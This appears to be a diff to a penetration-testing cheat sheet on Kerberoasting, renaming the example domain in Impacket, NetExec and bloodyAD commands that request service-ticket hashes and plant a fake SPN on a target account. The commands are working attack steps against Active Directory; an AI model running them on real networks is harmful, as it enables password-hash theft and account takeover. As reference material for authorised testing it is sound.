@@ -5,7 +5,7 @@ commands:
   - have: Credentials
     cmd: |
       # Request TGS tickets for all SPNs (Impacket)
-      impacket-GetUserSPNs senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile hashes.kerberoast
+      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile hashes.kerberoast
 
       # Kerberoasting via NetExec
       nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --kerberoasting output.txt
@@ -15,13 +15,13 @@ commands:
   - have: SPN
     cmd: |
       # Targeted Kerberoasting — set SPN on a vulnerable account
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName -v 'HTTP/fakespn.senshu.sh'
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName -v 'HTTP/fakespn.senshu.local'
 
       # Request TGS for the targeted account
-      impacket-GetUserSPNs senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile targeted.kerberoast
+      impacket-GetUserSPNs senshu.local/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27 -request -outputfile targeted.kerberoast
 
       # Clean up — remove the SPN after obtaining the hash
-      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName
+      bloodyAD -d senshu.local -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 set object targetuser servicePrincipalName
   - have: Shell
     cmd: |
       # Rubeus — Kerberoast from a Windows session
